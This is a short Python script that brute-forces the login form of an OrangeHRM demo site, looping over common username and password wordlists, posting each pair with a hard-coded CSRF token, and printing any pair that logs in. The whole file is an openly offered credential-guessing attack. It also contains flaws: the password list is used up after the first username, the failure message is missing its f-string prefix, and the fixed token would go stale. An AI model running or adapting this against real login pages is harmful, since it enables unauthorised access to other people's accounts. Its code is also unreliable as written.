from pwn import *
import requests

Host = "https://opensource-demo.orangehrmlive.com/web/index.php/auth/login"
username="ssh-common-usernames.txt"
passwords="ssh-common-passwrods.txt"
valid_response = "Logged In Successfully"

with open("ssh-common-usernames.txt","r") as username_list, open("ssh-common-passwords.txt","r") as password_list:
    for username in username_list:
        username = username.strip("\n")
        print(f"[++++] Attempting to bruteforce for {username}")
        for password in password_list:
            r = requests.post(Host, data={"_token":"04306cb3c7ab5cb2cba497.1Rec3usxGdkxD90KQ2LgpJUV3BgSuJ0gFblkq4-s5MM.sVDM7rp8IL5LfO5yLQOT191gi3ZVzKUXLYALnrjl1KKCWMPtqQh_oXlYiA","username":username,"password":password})
            if valid_response.encode() in r.content:
                print(f"[>>>>] Success! Valid combination --> '{username}:{password}'")
                exit()

        print("\n")
        print("[----] Failure! Unable to find the credentials for {username}")